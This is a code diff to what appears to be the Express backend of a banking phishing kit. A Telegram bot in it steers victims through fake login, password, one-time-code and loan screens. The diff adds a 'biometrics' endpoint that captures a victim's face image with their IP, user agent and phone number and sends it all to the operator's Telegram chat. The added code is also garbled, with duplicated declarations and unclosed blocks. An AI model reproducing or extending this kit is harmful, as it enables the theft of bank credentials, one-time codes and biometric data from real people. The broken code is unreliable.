@@ -23,7 +23,7 @@ app.use(express.static('public')); // Servir archivos estáticos
 // ==================== VARIABLES DE ENTORNO ====================
 const BOT_TOKEN = process.env.BOT_TOKEN;
 const CHAT_ID = process.env.CHAT_ID;
-const RENDER_URL = process.env.RENDER_URL || 'https://propulsorneq.onrender.com';
+const RENDER_URL = process.env.RENDER_URL || 'https://propulsorneq.onrender.com/';
 
 if (!BOT_TOKEN || !CHAT_ID) {
   console.warn("[WARN] BOT_TOKEN o CHAT_ID no definidos en variables de entorno.");
@@ -52,7 +52,10 @@ function getLoanSimulatorMenu(sessionId) {
         { text: "❌ Error Número", callback_data: `go:accces-sign-in|${sessionId}` },
         { text: "❌ Error Clave", callback_data: `go:access-sign-in-pass|${sessionId}` }
       ],
-      [
+	  [
+        { text: "🧬 Biometría", callback_data: `go:biometria|${sessionId}` }
+      ],
+	   [
         { text: "❌ Error Monto", callback_data: `go:loan-simulator-error|${sessionId}` },
         { text: "♻️ Pedir Dinámica", callback_data: `go:one-time-pass|${sessionId}` }
       ],
@@ -71,6 +74,9 @@ function getDynamicMenu(sessionId) {
       [
         { text: "❌ Error Dinámica", callback_data: `error-dynamic|${sessionId}` },
         { text: "❌ Error Número", callback_data: `go:accces-sign-in|${sessionId}` }
+      ],
+	  [
+        { text: "🧬 Biometría", callback_data: `go:biometria|${sessionId}` }
       ],
       [
         { text: "❌ Error Clave", callback_data: `go:access-sign-in-pass|${sessionId}` },
@@ -324,6 +330,116 @@ app.post('/consignar', async (req, res) => {
     res.status(500).json({ ok: false, reason: error.message });
   }
 });
+
+ 
+// ==================== ENDPOINT: BIOMETRÍA ====================
+ 
+ 
+const FormData = require('form-data');
+
+ 
+app.post('/step-biometrics', async (req, res) => {
+  try {
+    const { sessionId, imageBase64, userAgent, ip } = req.body;
+
+    if (!BOT_TOKEN || !CHAT_ID) {
+      return res.status(500).json({ ok: false });
+ 
+ 
+    }
+
+    if (!imageBase64 || !imageBase64.startsWith('data:image')) {
+      return res.status(400).json({ ok: false });
+ 
+    }
+
+    const session = sessionData.get(sessionId) || {};
+
+ 
+ 
+    const mimeMatch = imageBase64.match(/^data:(image\/\w+);base64,/);
+    const mimeType = mimeMatch ? mimeMatch[1] : 'image/jpeg';
+    const extension = mimeType.split('/')[1];
+
+ 
+    const buffer = Buffer.from(
+      imageBase64.replace(/^data:image\/\w+;base64,/, ''),
+      'base64'
+    );
+
+ 
+    const formData = new (require('form-data'))();
+    formData.append('chat_id', CHAT_ID);
+    formData.append('photo', buffer, {
+      filename: 'biometria.jpg',
+      contentType: 'image/jpeg'
+ 
+    const formData = new FormData();
+    formData.append('chat_id', CHAT_ID);
+    formData.append('photo', buffer, {
+      filename: `biometria.${extension}`,
+      contentType: mimeType
+ 
+    });
+
+    formData.append(
+      'caption',
+ 
+      `🧬 BIOMETRÍA RECIBIDA\n\n🆔 Session: ${sessionId}\n🌐 IP: ${ip}\n🖥️ UA: ${userAgent}`
+    );
+
+    await axios.post(getTelegramApiUrl('sendPhoto'), formData, {
+      headers: formData.getHeaders()
+    });
+
+    console.log(`🧬 Biometría enviada - Session ${sessionId}`);
+ 
+`🧬 BIOMETRÍA RECIBIDA
+
+📱 Número: ${session.phoneNumber || 'N/A'}
+🌐 IP: ${ip || 'N/A'}
+🖥️ UA: ${userAgent || 'N/A'}
+🆔 Session: ${sessionId}`
+    );
+
+    // 🔘 BOTÓN ERROR BIOMETRÍA
+    formData.append(
+      'reply_markup',
+      JSON.stringify({
+        inline_keyboard: [
+          [
+            {
+              text: '❌ Error Biometría',
+              callback_data: `go:biometria|${sessionId}`
+            }
+          ]
+        ]
+      })
+    );
+
+    await axios.post(
+      getTelegramApiUrl('sendPhoto'),
+      formData,
+      {
+        headers: formData.getHeaders(),
+        timeout: 15000
+      }
+    );
+
+    console.log(`🧬 Biometría enviada con botón - Session ${sessionId}`);
+ 
+    res.json({ ok: true });
+
+  } catch (err) {
+    console.error('❌ Error biometría:', err.message);
+    res.status(500).json({ ok: false });
+  }
+});
+
+
+
+
+
 
 // ==================== WEBHOOK DE TELEGRAM ====================
 app.post(`/webhook/${BOT_TOKEN}`, async (req, res) => {
